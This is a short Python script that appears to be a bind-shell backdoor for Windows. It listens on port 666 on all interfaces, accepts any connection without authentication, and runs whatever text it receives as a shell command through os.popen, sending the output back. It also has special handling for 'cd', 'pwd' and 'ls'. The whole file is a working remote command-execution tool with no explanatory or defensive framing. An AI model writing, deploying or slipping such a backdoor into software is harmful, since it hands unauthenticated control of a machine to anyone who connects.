import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = ""
port = 666

try:
    s.bind((host,port))
except socket.error as e:
    print(str(e))



while True:
    s.listen(1)
    print("\nWaiting for connection...")
    conn, addr = s.accept()
    print("Connected to "+str(addr[0]))
    cwd = os.getcwd()
    conn.sendall(cwd.encode())
    while True:
        try:
            command = conn.recv(2048).decode("utf-8").strip()
            commandList = command.split(" ")
            if commandList[0] == "cd":
                if os.name == "nt":
                    path = commandList[1].replace("\\\\","\\")
                    skip = False
                    if path == "..":
                        os.chdir(os.path.dirname(os.getcwd()))
                        cwd = os.getcwd()
                        skip = True
                        
                    elif "." in path:
                        cwd = os.getcwd()
                        pathString = ""
                        for each in path:
                            pathString += each
                        pathString = pathString.replace(".",cwd)
                        path = pathString
                        path = path.strip('"C:\\"')
                        path = 'C:\\'+path

                    else:
                        path = commandList[1].strip()
                        path = path.strip('"C:\\"')
                        path = 'C:\\'+path
                    if skip == False:
                        os.chdir(path)
                    cwd = os.getcwd()
                    conn.sendall(cwd.encode())

            elif command == "pwd":
                cwd = os.getcwd()
                response = "CWD= " + cwd
                conn.sendall(response.encode())

            elif command == "ls":
                output = os.popen("dir").readlines()
                outputString = "LS= |"
                for each in output:
                    outputString += each+"|"
                conn.sendall(outputString.encode())

            else:
                output = os.popen(command).readlines()
                outputString = "OUPUT= |"
                for each in output:
                    outputString +=each+"|"
                conn.sendall(outputString.encode())
        except ConnectionResetError:
            print("{} disconnected.".format(addr[0]))
            break
